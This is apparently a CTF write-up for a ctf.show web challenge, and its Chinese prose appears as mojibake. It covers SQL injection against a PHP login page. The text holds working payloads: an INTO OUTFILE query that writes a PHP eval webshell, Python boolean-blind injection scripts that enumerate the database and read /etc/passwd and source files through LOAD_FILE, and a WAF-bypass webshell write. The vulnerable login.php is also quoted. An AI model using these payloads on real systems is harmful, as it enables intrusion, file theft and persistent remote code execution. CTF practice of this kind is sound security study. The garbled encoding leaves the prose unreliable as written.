ç°åœ¨æœ‰ä¸‰ç§æ–¹å¼æ³¨å…¥

- å¸ƒå°”ç›²æ³¨
- æ—¶é—´ç›²æ³¨
- å †å æ³¨å…¥

é‚£è¿˜æ˜¯å¸ƒå°”ç›²æ³¨å¿«ä¸€ç‚¹ï¼Œå†™ä¸ªè„šæœ¬ï¼Œå†™è„šæœ¬è¿‡ç¨‹ï¼Œå‘ç°é¢˜ç›®è¿‡æ»¤äº†`'`å•å¼•å·ï¼ŒæŠŠå•å¼•å·ç½®ç©ºäº†ï¼ŒåŒå¼•å·è¿˜èƒ½ç”¨


#### å†™é©¬å­

åŒå¼•å·è¿˜èƒ½ç”¨ï¼Ÿç›´æ¥å†™é©¬å­

```plaintext
username=\&password=or 1=1;select "<?php highlight_file(__FILE__);eval(\$_POST[1]);?>" into outfile "/var/www/html/1.php"#
```



#### å¸ƒå°”ç›²æ³¨

å¸ƒå°”ç›²æ³¨å‘ç°æ•°æ®åº“é‡Œæ˜¯fake flag

```python
import requests

url = "http://5225f93f-e444-49d0-9bbb-fac89d89c23c.challenge.ctf.show/login.php"
flag = ""

i = 0
while True:
    i += 1
    low, high = 32, 126
    while low < high:
        mid = (low + high + 1) // 2
        # payload = f"or if(ascii(substr((select user()),{i},1))<{mid},1,0)#"
        
        # çˆ†åº“
        # information_schema,test,mysql,performance_schema,ctfshow_page_informations
        # payload = f"or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))<{mid},1,0)#"
        # çˆ†è¡¨
        # pages,users
        # payload = f"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{mid},1,0)#"
        # çˆ†åˆ—
        # USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
        # payload = f"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{i},1))<{mid},1,0)#"
        # çˆ†users è¡¨ password
        # CTF{this_is_a_fake_flag}
        # payload = f"or if(ascii(substr((select concat(password) from users),{i},1))<{mid},1,0)#"
        data = {"username": "\\", "password": payload}
        r = requests.post(url, data=data)
        # print(f"[+]payload: {payload}")
        if "Welcome" in r.text:
            high = mid - 1
        else:
            low = mid

    if low <= 32 or low >= 126:
        break

    flag += chr(low)
    print(f"[+]flag: {flag}")

print(f"[+]flag: {flag}")
```

å…¶å®æ•´ä¸ªè¿‡ç¨‹å¼€å§‹ä»¥ä¸ºå•åŒå¼•å·éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨çš„å…¶ä»–æ–¹å¼ï¼Œå¹¶ä¸”è¯»åˆ°äº†æºç ï¼Œè¯»ç¾äº†

- å¸ƒå°”ç›²æ³¨ + load_file è¯»å–æ–‡ä»¶
- hexç¼–ç ã€charå‡½æ•°å†™å…¥webshell


å¸ƒå°”ç›²æ³¨è¯»å–æ–‡ä»¶ï¼Œå±äºè¿æ°”å¥½ï¼ŒçŒœåˆ°`flag.txt`æ–‡ä»¶åäº†ï¼Œæ¢ä¸ªéš¾çŒœçš„å°±å¿…é¡»å†™ğŸäº†

![44](/medias/ctfshow-web/44.png)

ä½¿ç”¨`concat`ã€`hex`å‡½æ•°è¯»å–æ–‡ä»¶

```python
import requests

url = "http://5225f93f-e444-49d0-9bbb-fac89d89c23c.challenge.ctf.show/login.php"

flag = ""
i = 1

# æ–‡ä»¶è·¯å¾„è½¬åå…­è¿›åˆ¶
def str2hex(s):
    return "0x" + s.encode("utf-8").hex()

file_path = str2hex("/etc/passwd")
# file_path = str2hex("/var/www/html/login.php")
# file_path = str2hex("/flag.txt")
print("[#] LOAD_FILE è·¯å¾„:", file_path)

def visual_char(c):
    """æŠŠç‰¹æ®Šå­—ç¬¦å¯è§†åŒ–"""
    if c == "\n":
        return "\\n"
    elif c == "\r":
        return "\\r"
    elif c == "\t":
        return "\\t"
    elif ord(c) < 32 or ord(c) > 126:
        return f"\\x{ord(c):02x}"
    else:
        return c

while True:
    low, high = 10, 127  # ASCII å¯æ‰“å°å’Œç‰¹æ®Šå­—ç¬¦èŒƒå›´

    while low + 1 < high:
        mid = (low + high) // 2
        payload = f"or IF(ASCII(SUBSTR(LOAD_FILE({file_path}),{i},1))<{mid},1,0)#"
        data = {"username": "\\", "password": payload}
        r = requests.post(url, data=data)

        if "Welcome" in r.text:
            # æ¡ä»¶æˆç«‹ â†’ å­—ç¬¦ < mid
            high = mid
        else:
            # æ¡ä»¶ä¸æˆç«‹ â†’ å­—ç¬¦ >= mid
            low = mid

    # æ–‡ä»¶ç»“æŸæ£€æµ‹ï¼šLOAD_FILE è¿”å› NULL æˆ–ä¸å¯è¯»
    if low <= 0:
        print("[#] æ–‡ä»¶è¯»å–ç»“æŸ")
        break

    c = chr(low)
    flag += c
    print(f"[+] å½“å‰ flag: {''.join([visual_char(ch) for ch in flag])}")

    i += 1
```

å¯ä»¥è¯»å–åˆ°`/var/www/html/login.php`æºç 

```php
<?php
error_reporting(0);

include_once("conn.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // å»æ‰å•å¼•å·é˜²æ­¢ SQL æ³¨å…¥å°è¯•ï¼ˆä¸å®‰å…¨æ–¹å¼ï¼‰
    $username = str_replace("'", "", $username);
    $password = str_replace("'", "", $password);

    // SQL æŸ¥è¯¢
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

    if ($conn->multi_query($sql)) {
        do {
            if ($result = $conn->store_result()) {
                if ($result->num_rows > 0) {
                    session_start();
                    $_SESSION['username'] = $username;
                    header("Location: main.php");
                    exit();
                }
                $result->free();
            }
        } while ($conn->more_results() && $conn->next_result());
    } else {
        echo "<script>alert('Invalid username or password');history.back();</script>";
    }
} else {
    header("Location: index.php");
    exit();
}
?>
```

ä½¿ç”¨`concat`ã€`char`å‡½æ•°è¯»å–æ–‡ä»¶
```python
import requests

url = "http://5225f93f-e444-49d0-9bbb-fac89d89c23c.challenge.ctf.show/login.php"

target = ""
i = 1

# ä½¿ç”¨ char å‡½æ•°ç»•è¿‡å¼•å· è¯»å–æ–‡ä»¶è·¯å¾„
file_path = "/etc/passwd"
# file_path = "/var/www/html/login.php"
# file_path = "/flag.txt"
char_codes = [str(ord(c)) for c in file_path]
path = "CONCAT(CHAR({}))".format(",".join(char_codes))
print("[#] LOAD_FILE è·¯å¾„:", path)

def visual_char(c):
    """æŠŠç‰¹æ®Šå­—ç¬¦å¯è§†åŒ–"""
    if c == "\n":
        return "\\n"
    elif c == "\r":
        return "\\r"
    elif c == "\t":
        return "\\t"
    elif ord(c) < 32 or ord(c) > 126:
        return f"\\x{ord(c):02x}"
    else:
        return c

while True:
    low, high = 10, 126  # æ”¯æŒæ¢è¡Œ (\n) åˆ°å¯è§ ASCII

    while low + 1 < high:
        mid = (low + high) // 2
        payload = f"OR IF(ASCII(SUBSTR(LOAD_FILE({path}),{i},1))<{mid},1,0)#"
        data = {"username": "\\", "password": payload}

        r = requests.post(url, data=data)

        if "Welcome" in r.text:
            high = mid
        else:
            low = mid

    # åˆ¤æ–­æ–‡ä»¶ç»“æŸ
    if low <= 0:
        print("[#] æ–‡ä»¶è¯»å–ç»“æŸ")
        break

    c = chr(low)
    target += visual_char(c)
    print(f"[+] å½“å‰ç»“æœ: {target}")

    i += 1
```

### WAFç»•è¿‡

ä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œç›´æ¥å†™webshellï¼Œä»ç„¶å¯è¡Œ

```php
password=1&username=1'%09union%09select%091,2,'<?=phpinfo();?>'%09into%09outfile'/var/www/html/1.php'%23
```

å†™å…¥webshellï¼Œèšå‰‘æŸ¥çœ‹æ•°æ®åº“é…ç½®ï¼Œè¿æ¥æ•°æ®åº“ï¼ŒæŸ¥çœ‹flag

![](/medias/ctfshow-web/41.png)


